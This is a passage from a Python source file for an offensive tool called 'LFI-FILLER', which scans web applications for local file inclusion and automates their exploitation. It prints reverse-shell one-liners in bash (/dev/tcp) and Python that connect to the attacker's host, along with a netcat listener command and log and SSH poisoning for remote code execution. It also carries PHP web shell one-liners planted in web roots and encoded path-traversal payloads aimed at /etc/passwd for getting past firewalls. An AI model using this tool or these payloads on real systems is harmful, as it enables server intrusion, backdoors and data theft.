                    print(f"     Decode with: echo 'BASE64_CONTENT' | base64 -d")
        
        if self.results['log_poisoning'] or self.results.get('ssh_poisoning'):
            print(f"\n3. LOG POISONING RCE:")
            if self.results['log_poisoning']:
                for poison in self.results['log_poisoning'][:2]:
                    print(f"   {poison['url']}&{poison['param']}=COMMAND")
                    print(f"   Example: {poison['url']}&{poison['param']}=id")
            if self.results.get('ssh_poisoning'):
                print(f"   SSH Poisoning: {self._build_url(param, '/var/log/auth.log')}&ssh_cmd=COMMAND")
        
        if self.lhost and not self.webshell:
            print(f"\n4. REVERSE SHELLS (LHOST: {self.lhost}:{self.lport}):")
            print(f"   Listener: nc -lvnp {self.lport}")
            print(f"   Bash: bash -c \"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1\"")
            print(f"   Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
            
            if self.results['lfi_params']:
                param = self.results['lfi_params'][0]['param']
                print(f"\n   Usage: {self.url}?{param}=/var/log/auth.log&ssh_cmd=REVERSE_SHELL")
        
        if self.webshell:
            print(f"\n5. WEB SHELL CREATION:")
            print("   Manual web shell commands:")
            print("   echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php")
            print("   echo '<?=system($_GET[0]);?>' > /var/www/html/s.php")
            print("   echo '<?php eval($_POST[\"pass\"]); ?>' > /var/www/html/b.php")
            print("\n   Common locations:")
            print("   /var/www/html/")
            print("   /tmp/")
            print("   /dev/shm/")
            print("   /var/tmp/")
        
        print(f"\n6. ENCODING BYPASSES (Current: {self.encode or 'none'}):")
        print("   URL encode: ..%2f..%2fetc%2fpasswd")
        print("   Double URL encode: ..%252f..%252fetc%252fpasswd")
        print("   Unicode: ..%c0%af..%c0%afetc%c0%afpasswd")
        print("   Null byte: /etc/passwd%00")
        print("   With extension: /etc/passwd%00.jpg")
        
        print("\n" + "="*80)
    
    def run(self):
        print(f"""
╔══════════════════════════════════════════════════════════╗
║                   LFI-FILLER v2.0                        ║
║       Comprehensive LFI Scanner with Encoding Bypass     ║
╚══════════════════════════════════════════════════════════╝
""")
        
        print(f"[*] Target: {self.url}")
        if self.lhost and not self.webshell:
            print(f"[*] LHOST: {self.lhost}:{self.lport}")
        if self.custom_param:
            print(f"[*] Custom parameter: {self.custom_param}")
        if self.webshell:
            print(f"[*] Mode: Web shell creation")
        if self.encode:
            print(f"[*] Encoding: {self.encode}")
        print("")
        
        lfi_results = self.check_lfi()
        if not lfi_results:
            print("[-] No LFI found. Try different encoding or parameters.")
            return False
        
        param = lfi_results[0]['param']
        
        self.check_php_wrappers(param)
        self.enumerate_files(param)
        self.check_log_poisoning(param)
        self.check_ssh_poisoning(param)
        
        if self.lhost and not self.webshell:
            self.check_rfi(param)
            self.execute_shells(param)
        
        if self.webshell:
            self.create_webshell(param)
        
        self.show_results()
        return True

def print_banner():
    print("""
██╗     ███████╗██╗██╗      ██╗     ███████╗██████╗ 
██║     ██╔════╝██║██║      ██║     ██╔════╝██╔══██╗
██║     █████╗  ██║██║      ██║     █████╗  ██████╔╝
██║     ██╔══╝  ██║██║      ██║     ██╔══╝  ██╔══██╗
███████╗██║     ██║███████╗ ███████╗███████╗██║  ██║
╚══════╝╚═╝     ╚═╝╚══════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                                                            
    LFI Scanner with WAF Bypass & Auto-Exploitation
    """)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='LFI-FILLER: Advanced LFI scanner with WAF bypass & auto-exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════╗
║                     QUICK EXAMPLES                       ║
╚══════════════════════════════════════════════════════════╝

BASIC USAGE:
  python3 lfiller.py -u http://target.com/page.php

WITH REVERSE SHELL (you need netcat listener):
  python3 lfiller.py -u http://target.com/page.php -lh YOUR_IP -lp 4444

WEB SHELL MODE (creates PHP web shells instead of reverse shells):
  python3 lfiller.py -u http://target.com/page.php -w

CUSTOM PARAMETER (when default parameter list doesn't work):
  python3 lfiller.py -u http://target.com/page.php -p water

ENCODING BYPASS (for WAF evasion):
  python3 lfiller.py -u http://target.com/page.php -e url
  python3 lfiller.py -u http://target.com/page.php -e double
  python3 lfiller.py -u http://target.com/page.php -e unicode
  python3 lfiller.py -u http://target.com/page.php -e all

COMBINED ATTACK:
  python3 lfiller.py -u http://target.com/page.php -lh YOUR_IP -e all -w

╔══════════════════════════════════════════════════════════╗
║                 FLAG DESCRIPTIONS                        ║
╚══════════════════════════════════════════════════════════╝

REQUIRED:
  -u, --url      Target URL (must include http:// or https://)

REVERSE SHELL (use with -lh):
  -lh, --lhost   Your IP address for reverse shell connection
  -lp, --lport   Port for reverse shell (default: 4444)

WEB SHELL (alternative to reverse shell):
  -w, --webshell Create PHP web shells instead of reverse shells
                 Example: Creates shell.php with <?php system($_GET["cmd"]); ?>

PARAMETER TESTING:
  -p, --param    Test specific parameter (bypasses default list)
                 Useful when you know the vulnerable parameter name

ENCODING BYPASS:
  -e, --encode   Encoding method for WAF bypass:
                 none    : No encoding (default)
                 url     : URL encode (%2f for /)
                 double  : Double URL encode (%252f for /)
                 unicode : Unicode encode (%c0%af for /)
                 all     : Try all encoding methods

OTHER:
  -t, --timeout  Request timeout in seconds (default: 5)

╔══════════════════════════════════════════════════════════╗
║                 TROUBLESHOOTING                          ║
╚══════════════════════════════════════════════════════════╝

If script hangs during web shell creation:
  - Use Ctrl+C to interrupt
  - Try manual commands from the results
  - Reduce timeout with -t 3

If no LFI found:
  - Try different encoding: -e all
  - Try custom parameter: -p parameter_name
  - Check if URL is correct

For reverse shells:
  - Start listener first: nc -lvnp 4444
  - Ensure firewall allows inbound connections
  - Try different shell types if one fails
        """
    )
    
    parser.add_argument('-u', '--url', required=True, 
                       help='Target URL (e.g., http://target.com/page.php?param=value)')
    parser.add_argument('-lh', '--lhost', 
                       help='Your IP address for reverse shell connection')
    parser.add_argument('-lp', '--lport', type=int, default=4444, 
                       help='Reverse shell port (default: 4444)')
    parser.add_argument('-p', '--param', 
                       help='Custom parameter name to test (bypasses default parameter list)')
    parser.add_argument('-w', '--webshell', action='store_true', 
                       help='Create PHP web shells instead of reverse shells. Creates files like shell.php with <?php system($_GET["cmd"]); ?>')
    parser.add_argument('-e', '--encode', choices=['none', 'url', 'double', 'unicode', 'all'], 
                       default='none', 
                       help='Encoding method for WAF bypass. Use when normal payloads are blocked (default: none)')
    parser.add_argument('-t', '--timeout', type=int, default=5, 
                       help='Request timeout in seconds (default: 5)')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print("\n[!] ERROR: URL must start with http:// or https://")
        print(f"    Your input: {args.url}")
        print("    Example: http://target.com/vuln.php?file=index")
        sys.exit(1)
    
    if args.webshell and args.lhost:
        print("\n[!] NOTE: Web shell mode selected (-w flag detected)")
        print("[*] LHOST will be ignored for reverse shells")
        print("[*] The script will attempt to create PHP web shells instead")
        print("[*] Web shells will be created at common locations like /var/www/html/shell.php")
    
    # Convert 'none' to None for internal use
    encode_type = None if args.encode == 'none' else args.encode
    
    print("\n" + "="*60)
    print("STARTING SCAN WITH CONFIGURATION:")
    print("="*60)
    print(f"Target URL: {args.url}")
    if args.lhost and not args.webshell:
        print(f"Reverse Shell: {args.lhost}:{args.lport}")
    if args.webshell:
        print("Mode: Web Shell Creation")
    if args.param:
        print(f"Custom Parameter: {args.param}")
    if encode_type:
        print(f"Encoding: {encode_type}")
    print(f"Timeout: {args.timeout}s")
    print("="*60 + "\n")
    
    checker = LFI_Filler(
        args.url, 
        args.lhost, 
        args.lport, 
        args.timeout, 
        custom_param=args.param,
        webshell=args.webshell,
        encode=encode_type
    )
    
    try:
        checker.run()
    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user (Ctrl+C)")
        print("[*] Partial results may be available")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error during scan: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
